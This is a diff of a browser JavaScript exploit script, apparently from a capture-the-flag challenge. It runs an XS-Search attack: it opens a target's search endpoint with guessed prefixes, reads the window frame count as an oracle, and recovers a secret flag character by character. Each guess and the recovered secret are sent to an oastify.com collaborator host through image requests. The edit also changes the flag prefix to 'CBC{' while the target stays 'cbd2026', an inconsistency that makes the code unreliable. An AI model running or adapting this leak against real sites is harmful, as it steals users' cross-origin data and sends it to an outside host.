@@ -1,40 +1,52 @@
 <script>
 const BASE = "https://wonder.cbd2026.cloud";
-const EXFIL = "https://4jotvilavq82gpjfbab6grrvum0do4ct.oastify.com";
+const EXFIL = "https://njacv1ltv98lg8jybtbpgareu50wosch.oastify.com";
 
-const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
+const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*().,:;";
+let flag = "CBC{";
+
+function leak(s) {
+  new Image().src = EXFIL + "/?f=" + encodeURIComponent(s) + "&t=" + Date.now();
+}
 
 async function test(prefix) {
-    let w = open(BASE + "/search?q=" + encodeURIComponent(prefix));
-    await new Promise(r => setTimeout(r, 1800));
+  let w = open(BASE + "/search?q=" + encodeURIComponent(prefix), "_blank");
+  await new Promise(r => setTimeout(r, 2500));
 
-    let ok = false;
-    try {
-        ok = w.length > 0;
-    } catch(e) {}
+  let ok = false;
+  try {
+    ok = w.length > 0;
+  } catch(e) {}
 
-    w.close();
-    return ok;
+  try { w.close(); } catch(e) {}
+  return ok;
 }
 
 async function run() {
-    let flag = "CBD{";
+  leak("START");
 
-    while (true) {
-        for (let c of charset) {
-            let guess = flag + c;
+  while (true) {
+    let found = false;
 
-            if (await test(guess)) {
-                flag += c;
+    for (let c of charset) {
+      let guess = flag + c;
+      leak("TRY:" + guess);
 
-                // exfil (super reliable)
-                new Image().src = EXFIL + "/?f=" + encodeURIComponent(flag);
+      if (await test(guess)) {
+        flag += c;
+        leak(flag);
+        found = true;
 
-                if (c === "}") return;
-                break;
-            }
-        }
+        if (c === "}") return;
+        break;
+      }
     }
+
+    if (!found) {
+      leak("STUCK:" + flag);
+      return;
+    }
+  }
 }
 
 run();
